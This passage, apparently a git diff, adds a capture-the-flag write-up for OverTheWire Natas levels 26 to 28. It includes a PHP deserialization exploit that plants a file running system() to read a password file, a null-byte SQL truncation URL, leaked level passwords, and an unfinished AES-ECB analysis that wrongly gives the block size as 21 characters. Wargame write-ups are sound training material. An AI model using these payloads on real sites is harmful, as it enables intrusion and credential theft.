@@ -645,3 +645,112 @@ After changing our user agent and accessing the log file, we get our password in
 Username: natas26
 URL:      http://natas26.natas.labs.overthewire.org
 ```
+
+According to the source code, the coordinates are stored in the `drawing` cookie. If it exists, then it gets interpreted with this line:
+
+```php
+$drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+```
+
+Apparantly the `unserialize()` function is very vulnurable, as it allows us to run arbritary objects. Luckily the source code includes a class we can use called `Logger`.
+
+> ```php
+> class Logger{
+>     private $logFile;
+>     private $initMsg;
+>     private $exitMsg;
+> 
+>     function __construct($file){
+>         // initialise variables
+>         $this->initMsg="#--session started--#\n";
+>         $this->exitMsg="#--session end--#\n";
+>         $this->logFile = "/tmp/natas26_" . $file . ".log";
+>         ... 
+> ```
+
+What we can do is make an object with this `Logger` class, change the `exitMsg` to PHP code that will return the password (same as last problem), and change `logFIle` to an easily accessible path.
+
+```php
+<?php
+class Logger {
+    private $logFile;
+    private $initMsg;
+    private $exitMsg;
+    
+    function __construct(){
+        // initialise variables
+        $this->initMsg="#--session started--#\n";
+        $this->exitMsg="<?php system('cat /etc/natas_webpass/natas27'); ?>\n";
+        $this->logFile = "/var/www/natas/natas26/img/natas27Pass.php";
+    }
+}
+$log = new Logger();
+print base64_encode(serialize($log));
+?>
+
+```
+
+Running this code will return our new `drawing` cookie value: 
+
+```
+Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo0MjoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbmF0YXMyN1Bhc3MucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MjI6IiMtLXNlc3Npb24gc3RhcnRlZC0tIwoiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1MToiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4KIjt9
+```
+
+With a cookie editor, replace the `drawing` cookie with this one, and refresh the page. You will know if it works because the website will spit out an error, preventing you from accessing the source code. Access the created log file by going to `/img/natas27Pass.php`, and you'll find the password.
+
+```
+u3RRffXjysjgwFU6b9xa23i6prmUsYne
+```
+
+# 27
+
+```
+Username: natas27
+URL:      http://natas27.natas.labs.overthewire.org
+```
+
+The website presents a simple login page, with the provided source code.
+
+If there's a user with the provided username, then it will login and show the user's login details, if the password is correct. If it doesn't exist, then it will create a new SQLi entry with those details. We need to try to log in to `natas28`.
+
+The source code also provides the SQL table:
+
+```sql
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+```
+
+Since the size of the username and passwords are only 64 characters, we can try to post a username that is longer than 64 characters, which would let us pass through without checking if the password matches, creating more than one user called `natas28`.
+
+I did this by passing my GET parameters in the url. The username is "natas28"" followed by around 60 null characters (`%00`) and some random characters ("test") to prevent it from being truncated, and the password is just "test":
+
+```
+/?username=natas28%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00test&password=test
+```
+
+Passing this onto the website will show `User natas28test was created!`, but in reality the code has created an existing user under `natas28`, allowing us to log in with the password `test`. Doing so will show the password details for the first natas28 user.
+
+```
+Welcome natas28!
+Here is your data:
+Array ( [username] => natas28 [password] => 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj ) 
+```
+
+# 28
+
+```
+Username: natas28
+URL:      http://natas28.natas.labs.overthewire.org
+```
+
+Strangely there is no source code provided for this one. It seems to use SQL to get the jokes, but any injection methods sent through the search bar will not work here.
+
+I noticed when searching for something such as "test", it will go to `search.php` and send a `query` with the search (btw, here's a handy [URL Decoder/Encoder](https://meyerweb.com/eric/tools/dencoder/)): `G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPK/ZEJpSw8lYr3+NDY3VpFZKSh/PMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY=` 
+
+Another search with "passwords": `G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIQ+2QTbcCowp8YHJ+hQkThoJUi8wHPnTascCPxZZSMWpc5zZBSL6eob5V3O1b5+MA=`
+
+Playing with the values a bit gave me error messages such as `Zero padding found instead of PKCS#7 padding`, so this means the query uses AES with ECB mode, with blocks sized 21 characters each.
+
+TBD
